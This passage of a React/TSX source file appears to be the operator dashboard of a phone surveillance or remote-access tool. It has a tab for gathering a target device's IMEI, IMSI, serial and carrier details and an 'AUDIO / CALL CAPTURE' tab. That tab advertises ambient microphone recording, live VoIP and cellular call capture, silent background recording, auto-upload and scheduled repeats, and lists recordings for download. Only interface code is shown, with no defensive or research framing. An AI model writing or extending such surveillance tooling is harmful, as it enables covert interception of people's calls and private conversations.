                  {loading === "device" ? "GATHERING…" : "↓ GATHER INFO"}
                </button>
              </div>
              {Object.keys(deviceInfo).length === 0 ? (
                <EmptyState label="No device info" sub="Gather IMEI, IMSI, serial, carrier, and hardware identity" />
              ) : (
                <div className="grid grid-cols-2 gap-3">
                  {Object.entries(deviceInfo).map(([k, v]) => (
                    <div key={k} className="border border-green-900/20 rounded p-3">
                      <div className="text-[8px] text-green-900 tracking-widest mb-1">{k.toUpperCase().replace(/_/g, " ")}</div>
                      <div className="text-[11px] text-green-300 break-all">{v ?? "—"}</div>
                    </div>
                  ))}
                </div>
              )}
            </div>
          )}

          {/* ── AUDIO ─────────────────────────────────────────── */}
          {activeTab === "audio" && (
            <div>
              <div className="flex items-center gap-4 mb-6">
                <h2 className="text-xs tracking-widest text-green-400">AUDIO / CALL CAPTURE</h2>
                <div className="flex items-center gap-2">
                  <span className="text-[9px] text-green-900">DURATION (s)</span>
                  <input
                    type="number" value={recordDuration} min={5} max={3600}
                    onChange={(e) => setRecordDuration(Number(e.target.value))}
                    className="w-16 bg-[#030308] border border-green-900/30 text-green-400 text-[10px] px-2 py-1 rounded focus:outline-none focus:border-green-700"
                  />
                </div>
                <button onClick={startRecording} disabled={recording}
                  className={`px-4 py-1.5 text-[10px] tracking-widest border rounded transition-all ${
                    recording
                      ? "border-red-600 bg-red-950/30 text-red-400 animate-pulse cursor-not-allowed"
                      : "border-red-700/50 bg-red-950/10 text-red-500 hover:bg-red-900/20"
                  }`}>
                  {recording ? "⏺ RECORDING…" : "⏺ START CAPTURE"}
                </button>
              </div>

              <div className="mb-4 border border-green-900/20 rounded p-4">
                <div className="text-[10px] text-green-700 mb-2 tracking-widest">CAPABILITIES</div>
                <div className="grid grid-cols-2 gap-2 text-[9px] text-green-900">
                  {[
                    "Ambient microphone recording",
                    "Live call audio capture (VoIP + cellular)",
                    "Background audio in silence",
                    "Auto-upload to file vault",
                    "Speaker channel separation",
                    "Duration: 5s to 3600s",
                    "Format: WAV / MP4 audio",
                    "Continuous scheduling (auto-repeat)",
                  ].map((c) => <div key={c}>✓ {c}</div>)}
                </div>
              </div>

              {audioRecs.length > 0 && (
                <div>
                  <div className="text-[10px] text-green-700 mb-2 tracking-widest">CAPTURED RECORDINGS</div>
                  <div className="space-y-1">
                    {audioRecs.map((f, i) => (
                      <div key={i} className="flex items-center gap-3 border border-green-900/20 rounded px-3 py-2">
                        <span className="text-base">🎙️</span>
                        <span className="text-[10px] text-green-400 flex-1">{f}</span>
                        <a href={`/api/files/download?file=${encodeURIComponent(f)}`}
                          className="text-[9px] border border-green-800/40 text-green-700 hover:text-green-400 px-2 py-0.5 rounded transition-all">
                          DOWNLOAD
                        </a>
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

function EmptyState({ label, sub }: { label: string; sub: string }) {
  return (
    <div className="flex flex-col items-center justify-center py-20 text-center">
      <div className="text-[10px] text-green-900 tracking-widest mb-1">{label.toUpperCase()}</div>
      <div className="text-[9px] text-green-900/50">{sub}</div>
    </div>
  );
}
